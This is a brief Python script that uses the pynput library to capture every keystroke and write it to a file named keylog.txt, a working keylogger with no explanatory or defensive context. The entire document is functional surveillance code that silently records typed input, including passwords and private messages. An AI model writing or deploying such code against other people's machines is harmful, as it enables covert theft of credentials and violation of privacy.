from pynput.keyboard import Listener
import logging
file = "keylog.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(message)s")
def on_press(key):
    logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()
